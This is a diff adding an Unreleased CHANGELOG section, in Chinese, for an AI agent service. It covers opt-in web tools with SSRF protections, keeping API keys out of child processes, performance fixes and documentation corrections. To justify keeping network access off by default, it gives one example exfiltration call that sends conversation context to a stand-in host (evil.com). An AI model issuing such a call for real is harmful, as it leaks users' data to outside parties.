@@ -7,6 +7,37 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **联网能力（可选，默认关）**：新增 `src/tools/web.ts` 的 `web_fetch` / `web_search`，由 `PI_WEB=on`（或 `buildAgent({ web: true, webClient })`）开启。补齐了「`rules.md` 要求一切外部事实必须工具核实，但默认装配里根本没有联网工具」这个能力缺口。默认关闭的理由与 `coding` 档一致且更直接：**出站网络是数据外泄通道**（`web_fetch("https://evil.com/?d=<上下文内容>")`），而本服务默认无鉴权。
+  - **后端可注入**：`WebClient` 接口（`fetchPage` + 可选 `search`），换搜索源 / 加缓存 / 加审计只改实现，工具契约与模型侧不变；`lib.ts` 已导出类型。
+  - **SSRF 防护**：只放行 http/https，拒绝回环 / 私有 / 链路本地 / 组播 / CGNAT / IPv4 映射地址，**并检查 DNS 解析结果**与**重定向后的最终地址**（`::ffff:127.0.0.1` 会被 `new URL()` 归一化成 `::ffff:7f00:1`，十六进制写法同样覆盖）。`isPrivateAddress` 认不出的输入按私有处理（fail-closed）。
+  - **限额**：字节上限（默认 256KB，硬顶 2MB）与超时（默认 15s，硬顶 60s）都夹取，模型无法用参数顶掉；超限是**边读边停**，不把整页拉进内存。
+  - **不假装能搜**：后端没有 `search()` 时**不注册** `web_search`（与 `rag:smoke` 打印 SKIP 同一原则）；默认的 DuckDuckGo 无 JS 版解析是 best-effort，抽不到就如实说「没有命中」。
+  - 能力标签 `net` → `inferRisk` 判 `medium`；与 `exec` 同口径**不进 `allTools`**，开了才登记进 `ToolRegistry`。`SECURITY.md` / `.env.example` / 两份 README 都已注明「未被缓解的部分」（URL 由模型决定，DNS 解析与建连之间存在 TOCTOU 窗口）。
+
+- **README 的可验证数字改为生成**：新增 `scripts/visualization/generate_readme_numbers.mjs`，把文件数 / 行数 / 用例数 / 路由数从源码算出来写进 `<!-- BEGIN:generated-numbers -->` 标记块，`npm run docs:numbers:check` 已进 `verify` 链与两套 CI。此前同一份 README 里 `42 test files · 376 cases` 与 `# 376 unit + integration tests` 对着不同的数字。
+
+### Security
+
+- **Linux / macOS 的 `exec` 主执行路径不再继承 `PI_API_KEY`（P1-2 漏网之鱼）**：`src/exec/runner.ts` 的 `/bin/sh` 分支此前直接传 `process.env`，而 `src/child-env.ts` 的模块说明声称「凡是 spawn 子进程的地方都从这里取 env」——它恰好是唯一没兑现的地方，也是**主平台**。现改为 `childProcessEnv()`，并修正同文件 `taskkill` 分支里那句「凡 spawn 口径一致」的注释。新增 `src/exec/runner.test.ts` 用例锁定：子进程读不到 `PI_API_KEY` / `PI_API_KEY_<PROVIDER>`，但 `PATH` 等必须保留（否则 shell 与外部工具跑不起来）。
+
+### Fixed
+
+- **快照周期内不再重复取会话统计（P2-1）**：`getSessionStats()` 在 SDK 里是 `sessionManager.getEntries()` —— 每次调用都会 `fileEntries.filter(...)` **全量复制再全量扫描**一遍会话条目，而快照每个周期都要读它。现改为**按事件失效、周期内复用**：只有流式增量（`message_update` / `tool_execution_update`）不作废缓存，其余事件一律作废（保守方向：宁多算一次，也不显示过期 token / cost）。`src/integration.test.ts` 有用例锁定「流式期间不重复取数、`message_end` 后必然重取」。
+- **投影签名的构造少了两次分配（P2-2）**：`projectMessage` 的签名从「数组 + `join("|")`」改为模板串 —— 同一个结果，但不再为每条消息先造 n 个中间字符串（这个签名每个快照周期都要为每条消息重建一次）。同时把 `estimateTokensCached` 的注释改正：它是 O(消息条数) 次 WeakMap 查询，**不是**注释原先声称的 O(新增消息数)。
+- **`docs/项目分析报告.md` 会主动误导读者（文档一致性）**：它写于 0.3.0 之前，把一批**已经修好**的问题仍列为现状（`/files/read?path=.env`、`PI_API_KEY` 继承、`db.query()` 全量载入、子代理队列无上限…），并且在同一份文档里给出两组互相矛盾的验证数字（§0 记 `smoke 23/23`、`e2e 39/0跳`，§8 表记 `smoke 17/17`、`e2e 35+1跳过`），`§1.2` 的文件数也自相矛盾。现改为**归档页**：明确标注「历史快照，不再是现状描述」，逐条给出「当时判断 → 现在状态 + 依据」的对照表，并指向 `智能体视角评估.md` / README 的 Numbers / CHANGELOG 三个现状来源。正文通过 git 历史保留。
+- **`docs/能力与边界.md` 的三处过期**：基线 `e24c4c7` → `v0.3.0` 及其后工作区（且不再手写规模数字，改为指向生成的 Numbers 表）；「HITL 前端未接」→ 前端已接（`web/src/components/HitlDialog.tsx`）；「`docs/` 下只有三份活文档」→ 与实际目录一致，并区分手写与生成物。
+- **`scripts/release.mjs` 的推送失败信息补上撤销步骤**：原先只给「补推」命令，而走到那一步本地已经被改动过（版本回写提交 + 本地 tag）。现在按本次是否真的产生了回写提交，给出 `git tag -d` 与 `git reset --hard HEAD~1` 的完整还原步骤，并提醒**已推送成功的远程要各自单独回退**（脚本不会替你动已推送的引用）。
+
+### Changed
+
+- **SDK 私有形状访问彻底收敛**：`session.navigateTree` 从 `session-hub.ts` 就地断言改为 `sdk-adapter.ts` 的 `sdkNavigateTree()` —— 此前该文件自己的注释写着「私有访问统一收在 sdk-adapter」，而 `navigateTree` 是那个唯一没兑现的例外。
+- **覆盖率门禁（棘轮）**：新增 `scripts/coverage.mjs`，用 Node 内置 `--experimental-test-coverage`（零依赖，与测试同一次运行，不引入 c8/nyc），只看 `src/**`，阈值 `lines>=88 / branches>=77 / functions>=82`（实测基线 89.80 / 79.09 / 83.16，只允许往上调）。低版本 Node 上明确降级为普通测试并打印原因 —— 工具不支持不该被当成覆盖率不达标。已接入 `.github/workflows/ci.yml` 与 `.cnb.yml`。
+- **前端依赖也进审计**：`web/` 有自己的 lockfile，原先只审计根包等于前端依赖完全没人管。两套 CI 都补上 `npm --prefix web audit --audit-level=high`。
+- **前端测试面扩大**：新增 `web/src/pi/logClient.test.ts`（8 例，无头、`fetch` 打桩），覆盖筛选 → query 映射、非 2xx 的错误文案、AbortSignal 透传，以及 `queryAllForExport` 的分页边界（含「结果恰好等于上限且已无下一页时不得谎报截断」这条回归）。前端用例数 11 → 19。
+- **`rules.md` 新增第 10 条（联网）**：有 `web_fetch` 时用它核实外部事实并给出实际 URL；没有联网工具就直说无法核实，不拿记忆里的版本号当真。
+
 ## [0.3.0] - 2026-10-10
 
 ### Security
